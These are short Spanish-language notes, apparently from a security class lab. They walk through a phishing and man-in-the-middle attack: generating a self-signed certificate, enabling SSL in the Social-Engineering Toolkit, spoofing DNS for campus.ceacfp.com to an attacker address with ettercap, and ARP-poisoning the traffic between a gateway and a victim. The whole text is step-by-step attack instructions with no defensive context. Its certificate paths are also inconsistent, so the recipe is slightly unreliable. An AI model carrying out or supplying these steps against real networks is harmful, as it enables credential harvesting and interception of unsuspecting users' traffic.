# Certificates
Generar certificados en linux.pem
openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
mkdir /etc/ssl/public
cp key.pem /etc/ssl/private
cp cert.pem /etc/ssl/public

nano /etc/setoolkit/set.config

WEBATTACK_SSL=ON
WEB_PORT=443

PEM_CLIENT=/etc/ssl/public.PEM
PEM_SERVER=/etc/ssl/private/private.PEM


setoolkit
1
2
3


Instalar certificado a víctima

nano /etc/ettercap/etter.dns
  campus.ceacfp.com A 172.16.8.24

ettercap -G

desactivar primera opción 
arrancar ettercap

tres puntos --> plugins --> activar dns_spoof
tres puntos --> host --> scan host

Target 1 --> gateway
Target 2 --> Victima

Menú de MITM (Bola) --> ARP Poisoning --> primera opcion marcada OK

Pulsamos Play --> envenar victimas




